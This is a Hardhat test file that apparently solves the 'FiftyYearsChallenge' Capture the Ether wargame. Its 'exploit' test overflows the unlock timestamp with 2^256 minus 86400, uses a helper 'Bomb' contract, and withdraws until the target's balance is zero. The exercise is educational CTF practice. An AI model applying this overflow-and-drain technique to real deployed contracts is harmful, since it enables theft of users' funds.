import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('FiftyYearsChallenge', () => {
  let target: Contract;
  let bomb: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('FiftyYearsChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);

    bomb = await (await ethers.getContractFactory("Bomb", attacker)).deploy(target.address, { value: 2 })
  });

  it('exploit', async () => {
    await target.upsert(1, BigNumber.from(2).pow(256).sub(86400), { value: 1 })
    await target.upsert(2, 0, { value: 2 })
    await target.withdraw(2)

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
